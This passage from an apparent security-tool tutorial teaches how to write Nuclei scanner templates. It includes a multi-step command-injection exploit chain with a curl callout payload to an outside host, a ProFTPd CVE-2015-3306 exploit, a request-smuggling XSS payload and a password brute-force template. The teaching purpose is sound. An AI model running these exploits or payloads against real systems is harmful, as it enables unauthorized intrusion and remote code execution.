because it will allow us to use request conditions, which is a Nuclei feature we‚Äôll use a bit later. Numerous helper functions are provided by the Nuclei template engine to assist in matching. A more detailed reference exists here, however a few useful functions for writing matchers are:\n\nChaining Multiple Raw Requests\n\nThe first request has been written and now we need to tell Nuclei how to make the remaining 4 requests.\n\nThe next request will involve submitting the MM Wiki account registration form to create a new login. Here is the login form:\n\nThe actual request for the form submission is shown below:\n\nWe can see that we need to send a username and password as URL-encoded form parameters in the POST body.\n\nTo make more than one request, we add multiple array elements under the ‚Äúraw‚Äù field. Let‚Äôs add a second request, this time a POST to register.php with a username and password. The raw requests array now looks like this with our first two requests:\n\nrequests: - raw: - | GET {{Path}} HTTP/1.1 Host: {{Hostname}} - | POST {{Path}}/register.php HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded username=65aca3e27440558a&password=65aca3e27440558a\n\nIf the account was created successfully, we‚Äôll be able to login to the login.php page by submitting the credentials we chose. The request to the login form and response from the server looks like this:\n\nWe‚Äôll add another request to the end of the raw request array containing the following data:\n\n- | POST {{Path}}/login.php HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded username=65aca3e27440558a&password=65aca3e27440558a\n\nFollowing Redirects\n\nUpon a successful login, the login page will redirect our browser to home.php. For this exploit chain it doesn‚Äôt really matter whether we follow the redirect, however in cases where we want to ensure that Nuclei follows redirects, we would need to add the following to the template:\n\nredirects: true\n\nManaging Sessions\n\nAnother template feature we‚Äôll require here is the cookie reuse option. This is a boolean field that tells Nuclei to reuse the same session cookies in the HTTP request Cookie header with subsequent requests after they have been set by the application. To do this we need to add the following line to our template:\n\ncookie-reuse: true\n\nThen, when Nuclei interacts with our vulnerable application it will send the PHPSESSID cookie with each request.\n\nNow that we‚Äôve told Nuclei how to conduct steps 2 and 3 of the exploit chain, we move on to step 4, which is to fetch the backup_db.php page and extract the CSRF token from the backup form. To accomplish this we‚Äôll need to use the Nuclei template Extractor feature.\n\nExtractors\n\nExtractors will locate and extract a value if it is present in a response. The extracted value can then be displayed in the tool‚Äôs console output or used in subsequent requests. This feature is ideal for dealing with CSRF tokens or custom response headers or cookies that contain information that we need to include in a chain of requests.\n\nTo demonstrate how extractors work, let‚Äôs write the fourth step in our exploit chain of requests for our template.\n\nHere is the create backup form:\n\nTo fetch it, we need to append another request to the end of the array of raw requests:\n\n- | GET {{Path}}/backup_db.php HTTP/1.1 Host: {{Hostname}}\n\nHere is an excerpt of the HTML for the ‚Äúcreate backup‚Äù form (returned by a GET request to backup_db.php), with the location of the CSRF token highlighted:\n\nThe CSRF token is stored in a hidden form input. Once we receive the backup_db.php HTML response for the GET request, we need to extract the random CSRF token value using an extractor, so we can use it in the form submission for the next step. There are several types of extractors available including regexes, JSON query, Xpath and our old friend DSL. In this case we‚Äôll choose to use a regex and add these lines to the template:\n\nextractors: - type: regex name: csrftoken part: body internal: true # Required for using dynamic variables, if not set, then values are extracted and printed to console output group: 1 regex: # could also maybe use an Xpath Extractor - 'csrftoken\" value=\"([a-f0-9]{10})'\n\nSometimes Xpath might be easier to use. If we chose to use Xpath in this template, the extractor definition would instead be:\n\nextractors: - type: xpath name: csrftoken part: body internal: true attribute: value xpath: - '/html/body/form/p/input[2]'\n\nA quick tip for finding XPath expressions, is to use browser development tools to display the hierarchy of nodes for a given element. By opening dev tools in the browser and using the inspector to get information about a page element, the tools window should display the path to the selected node. For example, in Firefox the status bar area displays the path information for the selected element:\n\nOnce we extract the CSRF token from the response, we can use it in the final request that exploits the remote code execution vulnerability. If the application is vulnerable to the RCE flaw, the request and response data for the POST request to backup_db.php will look something like this:\n\nThe command injection point is in the backup_name parameter of the POST body data. We also need to supply the correct CSRF token (which we extracted in the previous step) in the POST body in the csrftoken parameter. Our request data we need to add to the template, at the end of the array of raw requests will be:\n\n- | POST {{Path}}/backup_db.php HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded backup_name=test123456&submit=Create+Backup&csrftoken={{csrftoken}}\n\nIf the app is vulnerable and the exploit succeeded, a hyperlink to the generated backup file will be displayed in the HTTP response returned by the application. We will need to use a matcher to detect the presence of the link and flag the critical vulnerability. A useful template feature that can be used here is request conditions.\n\nRequest Conditions\n\nRequest conditions are used in conjunction with DSL expressions in matchers. They allow logical expressions to include conditions spanning multiple requests/responses. To use request conditions, we need to add the ‚Äúreq-condition: true‚Äù option to the template. Attributes of a response can be suffixed with ‚Äú_<request_number>‚Äù to refer to specific responses, for example status_code_1, status_code_3, or body_2.\n\nFor our template, we will check the fifth response for the presence of the backup download link:\n\nreq-condition: true matchers: - type: dsl dsl: - \"contains(body_1,'MM Wiki Version')\" - \"contains(body_5,'downloadbackup.php?f=dbbackup-')\" condition: and\n\nNote that a list of multiple DSL expressions can be used. The logical operation used to evaluate the multiple expressions is specified using the ‚Äúcondition: <logical_operator>‚Äù field. In this case we use the logical ‚Äúand‚Äù operation, and the DSL expressions will be evaluated as:\n\ncontains(body_1,'MM Wiki Version') && contains(body_5,'downloadbackup.php?f=dbbackup-')\n\nAs a side-note, we could have just written the DSL expression as shown above, however if there is a long list of strings to match, using the YAML array notation is more readable.\n\nThe final template looks like this:\n\nid: mmwiki-rce info: name: MM Wiki DB Backup Remote Code Execution author: me severity: critical description: Detect MM Wiki database backup page Remote Code Execution vulnerability requests: - raw: - | GET {{Path}} HTTP/1.1 Host: {{Hostname}} - | POST {{Path}}/register.php HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded username=65aca3e27440558a&password=65aca3e27440558a - | POST {{Path}}/login.php HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded username=65aca3e27440558a&password=65aca3e27440558a - | GET {{Path}}/backup_db.php HTTP/1.1 Host: {{Hostname}} - | POST {{Path}}/backup_db.php HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded backup_name=test123456&submit=Create+Backup&csrftoken={{csrftoken}} redirects: true cookie-reuse: true extractors: - type: regex name: csrftoken part: body internal: true group: 1 regex: - 'csrftoken\" value=\"([a-f0-9]{10})' req-condition: true matchers: - type: dsl dsl: - \"contains(body_1,'MM Wiki Version')\" - \"contains(body_5,'downloadbackup.php?f=dbbackup-')\" condition: and\n\nOut of Band Interactions\n\nA reliable way of testing something like a remote code execution or SSRF vulnerability in an application is to use a payload that causes an out-of-band interaction. Essentially, this is where the application backend is enticed into connecting to an external service that we can somehow monitor. A popular interaction used by various tools is a DNS lookup or HTTP request to a host where the security researcher has access to logging functions.\n\nProjectDiscovery's interactsh tool was designed for this purpose. To demonstrate how we could use it in a Nuclei template, we could change the last request to inject an interactsh URL as part of the command injection payload and a matcher to check for the interaction.\n\nThe fifth raw HTTP request in the template would be changed to the following:\n\n- | POST {{Path}}/backup_db.php HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded backup_name=test%3Bcurl+{{interactsh-url}}%3Becho+&submit=Create+Backup&csrftoken={{csrftoken}}\n\nThe payload injected into the vulnerable parameter after URL decoding is:\n\ntest;curl {{interactsh-url}};echo\n\nThis will generate an interactsh URL such as, vyxlk2172l7dqfhn58gvy5362x8nwc.oast.fun and interpolate it into the request before it is sent to the server.\n\nThe matcher would be changed to the following:\n\n- type: word part: interactsh_protocol # Confirms the HTTP Interaction words: - \"http\"\n\nThis matcher will query the interactsh server and check if it received a HTTP request from the vulnerable target. Aside from a HTTP interaction, we could use DNS or SMTP instead. Further details about using out-of-band interactions can be found in the templating guide.\n\nHere is an example of what Nuclei will display for an interactsh detection:\n\nNon-HTTP Modes\n\nNuclei supports several non-HTTP modes for interacting with a target host and its services. These are:\n\nNetwork Mode\n\nTo illustrate network mode, we‚Äôll create a template to fingerprint an example service. First we would use a packet capture and inspection tool like wireshark to analyze the communication between a client and the network service so we can understand the expected requests and responses.\n\nFor example, to initiate the connection to the service, the client always sends the following binary data (the blue highlighted data is what we want; it‚Äôs the actual TCP payload and the preceding bytes are ethernet frame and TCP segment information which we can ignore):\n\nThe network protocol requires that the service responds with a data structure that always begins with the same 14-byte sequence that starts with 0xE5 0x15 0xE2:\n\nWe can write a template that uses network mode to detect whether this service is running on a target.\n\nThe key sections of a network template are:\n\ntemplate id\n\ntemplate info\n\nnetwork data\n\nhost\n\ninput data\n\nread length\n\nmatchers for host response\n\nOur example service could be detected using the following template:\n\nid: jnexcomm-detect info: name: JNEXComm Service Detection author: me severity: info network: - inputs: - data: \"{{hex_decode('9c05f72b9e4b967b434f4e4e0a0a0a')}}\" host: - \"{{Host}}:6101\" - \"{{Host}}:6102\" - \"{{Host}}:6103\" read-size: 14 matchers: - type: word words: - \"{{hex_decode('e515e23230fff7bef6019cc7c1c1')}}\"\n\nTo run this template against a host, the command line might look similar to:\n\nnuclei -u 10.20.30.40 -t jnexcomm-detect.yaml\n\nLet‚Äôs examine each of the key network data fields in the template example.\n\ninputs\n\nThe inputs field tells Nuclei what data to send to the remote service. The data can be expressed as a simple string value like HELLO\\r\\n, or various helper functions can be used to construct the request where more complex data is sent. In this case the data is supplied as hex values and decoded to their binary equivalent using the hex_decode() helper function.\n\nhost\n\nThe host field should normally only use the {{Host}} or {{Hostname}} variable. The difference is illustrated by the following example. If the user specifies the target like this:\n\nnuclei -u 10.20.30.40:8080\n\n{{Host}} will be assigned the value ‚Äú10.20.30.40‚Äù\n\n{{Hostname}} will be assigned the value ‚Äú10.20.30.40:8080‚Äù\n\nA network template can optionally specify a TCP port the service is expected to be found listening on, as is the case in the example shown above where we attempt to connect to ports 6101-6103. If we specify ports in the template we need to use {{host}}. Without hard-coding the TCP port numbers in the template, we would have to use {{Hostname}} and the user would be required to supply the port as part of the target host specification on the command line or in a target list file. For example:\n\nnuclei -t jnexcomm-detect.yaml -u 10.12.34.56:6101\n\nIf the service uses TLS transport security, it can be specified using the tls:// scheme like the following example:\n\nhost: - \"tls://{{Hostname}}\"\n\nread-size\n\nThe read-size field should specify how many bytes to read from the remote service‚Äôs response for the matcher to analyze. In this case, we only need to check the first 14 bytes of the response to fingerprint the service.\n\nmatchers\n\nThe matchers will be run against the bytes read from the service, and the matcher types are the same as those covered in the HTTP request mode. In this case, we use a simple string (word) matcher that, like the input, uses a helper function so we can express the expected service response signature in hex.\n\nMulti-Step Interactions\n\nLike HTTP mode, network mode can use multi-step communications against the target service. An example of a multi-step network template is this CVE-2015-3306 exploit\n\nid: CVE-2015-3306 info: name: ProFTPd RCE author: pd-team severity: high reference: https://github.com/t0kx/exploit-CVE-2015-3306 tags: cve,cve2015,ftp,rce network: - inputs: - data: \"site cpfr /proc/self/cmdline\\r\\n\" read: 1024 - data: \"site cpto /tmp/.{{randstr}}\\r\\n\" read: 1024 - data: \"site cpfr /tmp/.{{randstr}}\\r\\n\" read: 1024 - data: \"site cpto /var/www/html/{{randstr}}\\r\\n\" host: - \"{{Hostname}}\" read-size: 1024 matchers: - type: word words: - \"Copy successful\"\n\nDNS Mode\n\nThis mode allows DNS requests to be constructed and sent to nameservers. Nuclei‚Äôs matching and extraction features can be used to process and analyze the server‚Äôs responses. An example that illustrates the main components of a DNS mode template is:\n\nid: dummy-cname-a info: name: Dummy A dns request author: mzack9999 severity: none description: Checks if CNAME and A record is returned. dns: - name: \"{{FQDN}}\" type: A class: inet recursion: true retries: 3 matchers: - type: word words: # The response must contain a CNAME record - \"IN\\tCNAME\" # and also at least 1 A record - \"IN\\tA\" condition: and\n\nDNS queries are sent via the resolvers the system or Nuclei is configured to use. The key fields in the DNS data are summarized below.\n\nname\n\nThe domain or subdomain name to be resolved in the DNS query. This would normally be specified using the variable {{FQDN}}, for example the command:\n\nnuclei -t dns/caa-fingerprint.yaml -u mytargetdomain.com\n\nwould result in the {{FQDN}} variable being assigned mytargetdomain.com\n\ntype\n\nThe DNS record type requested in the query. Some common types are A, AAAA, TXT, MX, CNAME and PTR\n\nclass\n\nValid class types are inet, csnet, chaos, hesiod, none and any. Typically, this would be inet.\n\nrecursion\n\nTells Nuclei whether the DNS resolver should only return cached results, or traverse the DNS server hierarchy to retrieve the most recent results. Typically you would leave this option set to true.\n\nretries\n\nThe number of attempts a query will be tried before Nuclei gives up. A reasonable value for this is 3.\n\nmatchers\n\nThe matchers will be run against the bytes read from the service, and the matcher types are the same as those covered in the HTTP request mode. In this case, we use a simple string (word) matcher and the logical AND condition to ensure both terms are matched in the response.\n\nFile Mode\n\nWorks with files on the local file system and allows finding files within a folder hierarchy based on search patterns; and matching and extraction of data within them\n\nAn example file template that extracts Google API keys from files is shown:\n\nid: google-api-key info: name: Google API Key author: pdteam severity: info file: - extensions: - all - txt extractors: - type: regex name: google-api-key regex: - \"AIza[0-9A-Za-z\\\\-_]{35}\"\n\nTo run a File mode template on a filesystem folder target, the command line would look similar to:\n\nnuclei -u /path/to/folder/containing/subject/files/ -t google-api-key.yaml\n\nThe key fields within the file data definition are briefly described below.\n\nextensions\n\nA list of file extensions to process should be supplied to the template. The ‚Äúall‚Äù extension is basically a wildcard that matches all extensions except those supplied in an optional denylist. An example of a wildcard with a denylist is:\n\nextensions: - all denylist: - go - py - txt\n\nextractors\n\nFile mode only supports the word and regex extractor types. These behave in the same way as covered in the other modes.\n\nmatchers\n\nwhile not used in the example template, matchers can be used in File mode. Like extractors, only word and regex types can be used.\n\nHeadless Mode\n\nNuclei has headless mode, which uses a headless browser engine to interact with web pages. The browser engine is scripted using a Domain Specific Language (DSL) and allows automation of typical user actions such as left/right-clicking on page elements, or injecting keypresses and text into forms. The headless browser can also be scripted to take screenshots and run arbitrary JavaScript within the context of the page.\n\nHeadless mode could be useful for a few security assessment scenarios.\n\nNuclei‚Äôs headless mode templates are a useful tool for automated dynamic security tests in a CI/CD pipeline. Dynamic tests can be focused on things like business logic, and client-side vulnerabilities like XSS or arbitrary redirects.\n\nA web application may use a mix of HTTP requests and WebSockets, which may be very complex to write HTTP or network mode templates for. Using the headless mode browser may simplify testing.\n\nAn application may rely heavily on custom front-end JavaScript code. It might use libraries that are vulnerable to Object Prototype Pollution or DOM-based Cross-Site Scripting (XSS). Although there are numerous tools available to enumerate and check vulnerable libraries based on version numbers of dependencies, we might want to determine whether the application is actually exploitable.\n\nJavaScript static analysis involving tracing execution flows can be quite complicated, so automated dynamic testing of the application‚Äôs UI using headless mode might be a good approach.\n\nWe could use headless mode‚Äôs script injection action to inject custom JavaScript into the page. The code can inject payloads into data sources or into function arguments, then we can hook standard window functions to detect whether our payload resulted in say window.alert(), eval() or document.write() being triggered.\n\nA sample headless mode template is shown below. The template tests for possible DOM-based XSS via the window.name property.\n\nThe testing logic is concentrated in the custom JavaScript that is injected into the page (in the second action). Headless mode script injection can occur before the page is loaded by using the ‚Äúhook: true‚Äù option, as is the case in this example.\n\nThe script hooks some in-built sinks like innerHTML properties, document.write() and eval(), loads the page with the navigate action, then injects a payload of \"{{randstr_1}}'\\\"<>\" into the window.name property of the target page using another script action.\n\nHeadless mode allows us to use a matcher or extractor to inspect the value of a JavaScript object. The JavaScript code snippet containing the object must be named using the name field (eg. ‚Äúname: some_js_code‚Äù) and can be referenced using the part field of an extractor (eg. ‚Äúpart: some_js_code‚Äù). In the example, the ‚Äúwindow.alerts‚Äù property is contained in a script action named ‚Äúalerts‚Äù, and it is referenced in the matcher and extractor as ‚Äúpart: alerts‚Äù.\n\nid: window-name-domxss info: name: window.name DOM XSS author: pd-team severity: medium headless: - steps: - action: setheader args: part: response key: Content-Security-Policy value: \"default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;\" - action: script args: hook: true code: | (function() {window.alerts = []; function logger(found) { window.alerts.push(found); } function getStackTrace () { var stack; try { throw new Error(''); } catch (error) { stack = error.stack || ''; } stack = stack.split('\\n').map(function (line) { return line.trim(); }); return stack.splice(stack[0] == 'Error' ? 2 : 1); } window.name = \"{{randstr_1}}'\\\"<>\"; var oldEval = eval; var oldDocumentWrite = document.write; var setter = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML').set; Object.defineProperty(Element.prototype, 'innerHTML', { set: function innerHTML_Setter(val) { if (val.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'innerHTML', source: 'window.name', code: val, stack: getStackTrace()}); } return setter.call(this, val) } }); eval = function(data) { if (data.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'eval' ,source: 'window.name', code: data, stack: getStackTrace()}); } return oldEval.apply(this, arguments); }; document.write = function(data) { if (data.includes(\"{{randstr_1}}'\\\"<>\")) { logger({sink: 'document.write' ,source: 'window.name', code: data, stack: getStackTrace()}); } return oldEval.apply(this, arguments); }; })(); - args: url: \"{{BaseURL}}\" action: navigate - action: waitload - action: script name: alerts args: code: \"window.alerts\" matchers: - type: word part: alerts words: - \"sink:\" extractors: - type: kval part: alerts kval: - alerts\n\nHeadless mode templates provide numerous actions to script the browser engine. While we won‚Äôt describe all of them here, some commonly used ones are navigate, click, text, waitload and keypress. The full list of actions can be found in the official templating guide.\n\nTo demonstrate some of the common actions, let‚Äôs rework our MM Wiki RCE template to use headless mode.\n\nThe main template data goes under the ‚Äúheadless‚Äù field. This should contain ‚Äústeps‚Äù (an array of actions), ‚Äúmatchers‚Äù and ‚Äúextractors‚Äù.\n\nEach action requires arguments, such as a URL for navigate actions, or text value for text actions. Several of the most common actions require a selector to pinpoint which DOM element the action applies to, for example <input> or <button> elements. The headless template engine provides a few selector types including XPath, regex or CSS selectors (ID or class). In the example template, we use XPath selectors to associate click and text actions with their appropriate form elements.\n\nOur MM Wiki RCE template converted to use headless mode interactions looks like this:\n\nid: mmwiki-rce-headless info: name: MMWiki RCE Headless Mode author: me severity: critical headless: - steps: - action: navigate args: url: \"{{BaseURL}}/register.php\" - action: waitload - action: text args: by: xpath value: 65aca3e27440558a xpath: /html/body/div/form/div/input[1] - action: text args: by: xpath value: 65aca3e27440558a xpath: /html/body/div/form/div/input[2] - action: click args: by: xpath xpath: /html/body/div/form/div/button - action: waitload - action: navigate args: url: \"{{BaseURL}}/index.php\" - action: waitload - action: text args: by: xpath value: 65aca3e27440558a xpath: /html/body/div/form/div/input[1] - action: text args: by: xpath value: 65aca3e27440558a xpath: /html/body/div/form/div/input[2] - action: click args: by: xpath xpath: /html/body/div/form/div/button[1] - action: waitload - action: navigate args: url: \"{{BaseURL}}/backup_db.php\" - action: waitload - action: text args: by: xpath value: \"test;curl {{interactsh-url}};echo \" xpath: /html/body/form/input[1] - action: click args: by: xpath xpath: /html/body/form/p/input[1] - action: waitload matchers: - type: word part: interactsh_protocol # Confirms the HTTP Interaction words: - \"http\"\n\nThe template should be run using the -headless option on the CLI, like this:\n\nnuclei -u https://10.20.30.40 -t mmwiki-rce-headless.yaml -headless\n\nIt‚Äôs important to remember to use the -headless flag! Without it, Nuclei will still run the template but you probably won‚Äôt get any findings or any indication that nothing is actually being sent to the target.\n\nAdvanced Fuzzing\n\nWe touched on some basic fuzzing of applications in HTTP mode earlier. Nuclei templates support some more advanced features for fuzzing. We‚Äôll get an overview of them here.\n\nThese features are:\n\nUnsafe Requests\n\nPipelining\n\nConnection Pooling\n\nRace Conditions\n\nUnsafe Requests\n\nNuclei support malformed HTTP requests via the rawhttp library, which can be used to test issues like HTTP request smuggling and host header injection. To use Unsafe HTTP mode, the unsafe: true option needs to be set in the request block. The following short request smuggling example demonstrates an unsafe request:\n\nrequests: - raw: - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 150 Transfer-Encoding: chunked 0 GET /post?postId=5 HTTP/1.1 User-Agent: a\"/><script>alert(1)</script> Content-Type: application/x-www-form-urlencoded Content-Length: 5 x=1 - |+ GET /post?postId=5 HTTP/1.1 Host: {{Hostname}} unsafe: true # Enables rawhttp client matchers: - type: dsl dsl: - 'contains(body, \"<script>alert(1)</script>\")'\n\nPipelining\n\nHTTP pipelining is a feature of the HTTP protocol (since version 1.1) that allows multiple requests to be sent over the same TCP connection without waiting for each corresponding response. This differs from connection reuse, where even though the same TCP connection is used for multiple requests, the client waits for the server response before making the next request. Pipelining optimises network latency and bandwidth when fetching resources from a web server.\n\nThis diagram from Mozilla‚Äôs developer documentation visually compares latency between standard HTTP connection, connection reuse and pipelining:\n\nSource: https://developer.mozilla.org/en-US/docs/Web/HTTP/Connection_management_in_HTTP_1.x/http1_x_connections.png\n\nNuclei provides HTTP pipelining in templates, however pipelining must be supported by the target host. If the host doesn't support pipelining the engine will fall back to standard HTTP requests. To confirm whether the target supports HTTP Pipelining, you can use httpx, with the flag -pipeline to test it.\n\nThe following options need to be included in the template:\n\nunsafe: true pipeline: true pipeline-concurrent-connections: 40 pipeline-requests-per-connection: 25000\n\nAn example of a template that uses pipelining is:\n\nid: pipeline-testing info: name: pipeline testing author: pdteam severity: info requests: - raw: - |+ GET /{{path}} HTTP/1.1 Host: {{Hostname}} Referer: {{BaseURL}} attack: batteringram payloads: path: path_wordlist.txt unsafe: true pipeline: true pipeline-concurrent-connections: 40 pipeline-requests-per-connection: 25000 matchers: - type: status part: header status: - 200\n\nConnection Pooling\n\nNuclei supports multiple threads reusing the same TCP connection for faster scanning or fuzzing. Be careful to not use \"Connection: close\" in the headers of any requests, otherwise Nuclei will fall back to standard HTTP requests. To use connection pooling, set the \"threads: <int>\" option in the HTTP mode template with the number of desired threads. The example HTTP basic auth brute-force template below demonstrates how to use connection pooling with 40 threads:\n\nid: fuzzing-example info: name: Connection pooling example author: pdteam severity: info requests: - raw: - | GET /protected HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('admin:¬ßpassword¬ß')}} attack: batteringram payloads: password: password.txt threads: 40 matchers-condition: and matchers: - type: status status: - 200 - type: word words: - \"Unique string\" part: body\n\nRace Conditions\n\nRace Conditions are a bug class that focus on application behaviour anomalies that result from making numerous requests that involve accessing a shared resource, which arrive almost simultaneously. It can be quite difficult to test for race conditions with most popular scanning tools.\n\nTools that do provide features for testing race conditions commonly use a technique called gating, where the bytes for multiple requests are sent at once, minus the last byte, which is sent at the same time for all requests. This synchronizes the multiple requests to arrive as closely as possible. This is the technique that Nuclei uses for its race conditions mode.\n\nTo enable a race condition check within a template, set the option \"race: true\" and the race_count value to the number of simultaneous requests to send.\n\nThis is an example race condition template that sends 10 of the same request simultaneously to the target.\n\nid: race-condition-testing info: name: Race condition testing author: pdteam severity: info requests: - raw: - | POST /coupons HTTP/1.1 Host: {{Hostname}} promo_code=20OFF race: true race_count: 10 matchers: - type: status part: header status: - 200\n\nFor example, if the discount coupon was limited to 5 uses, you would run the template against the target and count the number of matched responses, checking whether they exceeded 5 that had status code 200. If there were more than 5, this would suggest a race condition bug may be present in the application. The screenshot below shows that all 10 requests resulted in a 200 OK status code.\n\nWorkflows\n\nEarlier, we looked at how template filtering options can allow us to do more intelligent and targeted scans instead of blasting virtually every template at the target. Nuclei‚Äôs workflows feature upon this concept by providing a consistent, repeatable method of defining automated, sequenced scanning flows using YAML files. Workflows typically use conditional logic to conduct fingerprinting against the target and based on the outcome, decide whether to run templates.\n\nFor example, a target‚Äôs tech stack can be fingerprinted using a template that detects the web framework in use. If WordPress is detected, templates for WordPress will run. If not, then they won't. This results in less traffic volume, and faster results.\n\nWorkflows can be generic (simple) or conditional. Generic workflows just define a sequence of templates to run. An example is:\n\n# mandatory template info goes up here (id, name etc) # workflow definition: workflows: - template: files/git-config.yaml - template: files/svn-config.yaml - template: files/env-file.yaml - template: cves/2022/ - tags: xss,ssrf,cve,lfi\n\nNote that it doesn‚Äôt do any enumeration or fingerprinting of the target, it just blindly runs the selected scripts. This might be an approach where prior information about the target‚Äôs tech stack is known and we can save time by skipping fingerprinting.\n\nThe gist of conditional workflows is:\n\nRun a template to fingerprint the target(s)\n\nMaybe run other templates depending on the results of the first template\n\nThe essential components of conditional workflow definitions are:\n\nTemplate\n\nMatchers (optional, to define more detailed conditions than just the prior one finding something)\n\nSubtemplate (used to define a conditionally-run template)\n\nThe following workflow doesn‚Äôt use any matchers, it will run the subtemplates only if the template has any findings:\n\nworkflows: - template: technologies/jira-detect.yaml subtemplates: - tags: jira - template: exploits/jira/\n\nThe following workflow uses a matcher and will check for whether the output of the tech-detect template contains the string ‚Äúwordpress‚Äù before it runs various WordPress templates:\n\nworkflows: - template: technologies/tech-detect.yaml matchers: - name: wordpress subtemplates: - template: cves/CVE-2019-6715.yaml - template: cves/CVE-2019-9978.yaml - template: files/wordpress-db-backup.yaml - template: files/wordpress-debug-log.yaml\n\nConditional workflows can chain multiple conditions for a complex sequence of template execution. An example of a conditional workflow template is:\n\nworkflows: - template: technologies/tech-detect.yaml matchers: - name: foo-xyz subtemplates: - template: technologies/foo-xyz-version-3.yaml subtemplates: - template: cves/2022/CVE-2022-123456.yaml subtemplates: - template: cves/CVE-2022-123457.yaml\n\nThis hypothetical example will only run the CVE-2022-123457 template if:\n\nThe tech-detect template detects foo-xyz AND the version of foo-xyz is 3.x AND it detects CVE-2022-123456.\n\nSo, in summary, workflows provide the ability to define more efficient and targeted scanning steps to save and share.\n\nConclusion\n\nNuclei is an efficient, extensible, open-source vulnerability scanner that can produce useful results out-of-the-box, using just a few command-line options. It has a tonne of neat features though, that when used within custom templates and workflows, will unlock the true power of the tool.\n\nThis guide has hopefully given you an understanding of the many features Nuclei provides for enumerating information and finding bugs in live targets. If you really want to become an expert Nuclei user, we recommend reading the official documentation, analyzing some of the community-developed templates, and most importantly, having a go at writing your own templates and workflows.\n\nIn the time since this blog was initially published Nuclei has gone through many releases. The release of Nuclei v3 includes support for Code Protocol and JavaScript. Check out the Nuclei v3 blog for a great walkthrough of all the additional features.\n\nProjectDiscovery Cloud Platform\n\nIn addition to Nuclei and the dozens of open-source tools , ProjectDiscovery is also actively working towards the release of their enterprise tool - ProjectDiscovery Cloud Platform.\n\nProjectDiscovery Cloud Platform (PDCP) is a hosted, enterprise product designed to provide continuous visibility across your external attack surface by detecting exploitable vulnerabilities and misconfigurations. It is built for the enterprise to scale and support the key workflows application security teams need to secure their infrastructure.\n\nInterested in testing out PDCP with your existing Nuclei scans? We have a beginners guide that walks you through that process, or you can jump directly to connecting your Nuclei scans to PDCP.\n\nAdditional Resources\n\nMain Nuclei documentation\n\nNuclei Templating Guide\n\nNuclei Template Syntax Reference\n\nTemplate Editor (Nuclei and ProjectDiscovery Cloud Platform)\n\n- Justin Sutherland, @v3natoris"
    }
}